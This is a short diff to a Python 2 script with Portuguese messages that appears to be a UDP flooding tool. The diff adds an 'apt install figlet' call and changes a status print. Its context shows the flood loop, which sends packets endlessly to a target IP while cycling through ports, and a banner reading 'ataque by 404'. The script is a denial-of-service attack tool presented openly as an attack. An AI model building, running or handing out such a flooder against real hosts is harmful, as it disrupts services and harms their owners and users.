@@ -86,6 +86,7 @@ Atualizando pacotes aguarde...
 
 os.system("apt-get upgrade")
 os.system("apt-get update")
+os.system("apt install figlet")
 print "pacotes instalados"
 time.sleep(1)
 
@@ -112,7 +113,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[94mSent %s ip %s port:%s\033[0m"%(sent,ip,port)
+     print "\033[94mP %s ip %s porta %s\033[0m"%(sent,ip,port)
      print "\033[91m[+]\033[0m \033[94mataque by 404\033[0m"
      if port == 65534:
        port = 1
